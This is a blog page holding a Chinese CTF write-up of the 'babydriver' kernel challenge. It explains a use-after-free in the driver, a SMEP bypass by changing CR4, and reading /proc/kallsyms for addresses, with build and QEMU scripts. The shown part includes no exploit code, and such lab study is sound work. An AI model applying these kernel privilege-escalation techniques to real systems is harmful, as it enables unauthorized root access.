@@ -1,0 +1,1209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="henry">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/11/28/kernelheap/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="UAF &amp; ret2usr参考链接：  https:&#x2F;&#x2F;blog.csdn.net&#x2F;kingbaby20lin&#x2F;article&#x2F;details&#x2F;47100989  https:&#x2F;&#x2F;ctf-wiki.org&#x2F;en&#x2F;pwn&#x2F;linux&#x2F;kernel-mode&#x2F;exploitation&#x2F;heap&#x2F;heap_overview&#x2F;  https:&#x2F;&#x2F;hornos3.github.io&#x2F;2023&#x2F;02&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UAF &amp; babydriver">
+<meta property="og:url" content="http://example.com/2023/11/28/kernelHeap/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="UAF &amp; ret2usr参考链接：  https:&#x2F;&#x2F;blog.csdn.net&#x2F;kingbaby20lin&#x2F;article&#x2F;details&#x2F;47100989  https:&#x2F;&#x2F;ctf-wiki.org&#x2F;en&#x2F;pwn&#x2F;linux&#x2F;kernel-mode&#x2F;exploitation&#x2F;heap&#x2F;heap_overview&#x2F;  https:&#x2F;&#x2F;hornos3.github.io&#x2F;2023&#x2F;02&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_18-52-36.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_18-59-02.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_19-15-06.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_19-18-36.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_19-20-28.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_19-23-39.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_19-27-32.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_19-27-47.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_19-48-03.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_20-06-24.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_20-12-58.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_20-34-43.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_20-34-01.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_20-37-53.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-03-34.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-05-10.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-06-55.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-28-15.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-26-45.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-33-10.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-40-39.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-42-34.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-46-52.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-50-41.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-55-27.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-56-36.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_21-59-30.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-28_22-01-12.png">
+<meta property="article:published_time" content="2023-11-28T14:13:47.389Z">
+<meta property="article:modified_time" content="2023-11-28T14:17:11.828Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="ret2usr">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="tty_struct">
+<meta property="article:tag" content="smep_bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2023-11-28_18-52-36.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/icon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            UAF &amp; babydriver -
+        
+        Henry Martin
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Henry Martin
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/links/">LINKS
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-regular fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/links/">LINKS</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">UAF &amp; babydriver</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/henry.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-11-28 22:13:47</span>
+        <span class="mobile">2023-11-28 22:13:47</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-28 22:17:11</span>
+            <span class="mobile">2023-11-28 22:17:11</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/kernel/">kernel</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/kernel/heap/">heap</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/kernel/heap/UAF/">UAF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/kernel/">kernel</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2usr/">ret2usr</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/UAF/">UAF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/tty-struct/">tty_struct</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/smep-bypass/">smep_bypass</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="UAF-ret2usr"><a href="#UAF-ret2usr" class="headerlink" title="UAF &amp; ret2usr"></a>UAF &amp; ret2usr</h1><p>参考链接：</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/kingbaby20lin/article/details/47100989" >https://blog.csdn.net/kingbaby20lin/article/details/47100989 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/heap/heap_overview/" >https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/heap/heap_overview/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hornos3.github.io/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-2/" >https://hornos3.github.io/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-2/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x04-Kernel-Heap-Use-After-Free" >https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x04-Kernel-Heap-Use-After-Free <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p>其中前两博客对内核堆分配器讲的比较通俗易懂。</p>
+<p>​	下面代码摘自上面第三位博主的代码，方便在调试时输出二进制数据。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">		<span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">		<span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">		<span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">		output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">				<span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">		<span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">		index += <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h1><p>​	<strong>知识点：UAF、ret2usr、tty_struct、smep_bypass</strong></p>
+<p>​	给了一个压缩包文件，解压后得到老三样。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_18-52-36.png"
+                      alt="nipaste_2023-11-28_18-52-3"
+                ></p>
+<p>​	文件系统解压，然后拿出驱动文件进行分析。</p>
+<p><strong>解压</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> core</span><br><span class="line"><span class="built_in">cd</span> core </span><br><span class="line"><span class="built_in">mv</span> ../core.cpio core.cpio</span><br><span class="line">cpio -idm &lt; ./core.cpio</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>压缩</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./core</span><br><span class="line">find . | cpio -o --format=newc &gt; core.cpio</span><br><span class="line"><span class="built_in">mv</span> core.cpio ../</span><br><span class="line"><span class="built_in">cd</span> ../</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>一键编译打包脚本</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">gcc ./exploit.c -o exploit -g -static -masm=intel</span><br><span class="line"><span class="built_in">mv</span> exploit ./core</span><br><span class="line"><span class="built_in">cd</span> ./core</span><br><span class="line">find . | cpio -o --format=newc &gt; core.cpio</span><br><span class="line"><span class="built_in">mv</span> core.cpio ../</span><br><span class="line"><span class="built_in">cd</span> ../</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-initrd ./core.cpio \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-append <span class="string">&quot;console=ttyS0 root=/dev/ram oops=panic panic=1&quot;</span> \</span><br><span class="line">	-enable-kvm \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-m 256M \</span><br><span class="line">	--nographic  \</span><br><span class="line">	-smp cores=1,threads=1 \</span><br><span class="line">	-cpu kvm64,+smep \</span><br><span class="line">	-no-reboot \</span><br><span class="line">	-s</span><br></pre></td></tr></table></figure></div>
+
+<p>​	解压后的启动脚本很乱，经调整形成上面代码，  <code>-cpu kvm64,+smep</code> 开了 smep 保护，但没有开 smap，所以我们仍然可以在用户态布置 ROP 链，而且可以通过修改 cr4 寄存器，绕过 smep 保护，直接执行用户态代码（若程序开启了 KPTI 除外）。</p>
+<p>​	还有一点注意的是，脚本这里没有限制我们读取     <code>/proc/kallsyms</code> 的符号地址，所以可以直接读该文件来获取地址信息。</p>
+<p><strong>程序保护</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_18-59-02.png"
+                      alt="nipaste_2023-11-28_18-59-0"
+                ></p>
+<p>​	</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_19-15-06.png"
+                      alt="nipaste_2023-11-28_19-15-0"
+                ></p>
+<p>​	驱动文件在关掉后，没有将    <code>babydev_struct.device_buf</code> 置空，这里存在 UAF 漏洞。</p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p><strong>babydriver_init</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_19-18-36.png"
+                      alt="nipaste_2023-11-28_19-18-3"
+                ></p>
+<p>​	在 init 函数中，会创建一个设备文件，即babydev，后面可以通过驱动中对应功能，实现通信。</p>
+<p><strong>babyioctl</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_19-20-28.png"
+                      alt="nipaste_2023-11-28_19-20-2"
+                ></p>
+<p>​	在ioctl中就实现了一个功能，即通过 arg 控制 _kmalloc 申请的空间大小，其实从反编译出来的代码不太好看对应参数是由哪个寄存器控制，这里建议结合汇编食用。</p>
+<p><strong>babyopen</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_19-23-39.png"
+                      alt="nipaste_2023-11-28_19-23-3"
+                ></p>
+<p>​	程序在打开时会默认分配 0x40 大小的chunk，其中 len 大小也会设置为 0x40，不过无妨，我们仍可以通过上面的 ioctl 函数进行重新分配。</p>
+<p><strong>babywrite</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-28_19-27-32.png"
+                      alt="nipaste_2023-11-28_19-27-3"
+                ></p>
+<p>​	反编译出来的代码直接没参数了（6，太6了），看一下汇编其实就可以知道实际上就是把我们 buf 写入到 device_buf 中。</p>
+<p><strong>babyread</strong></p>
+<p><img  
+                     lazyload
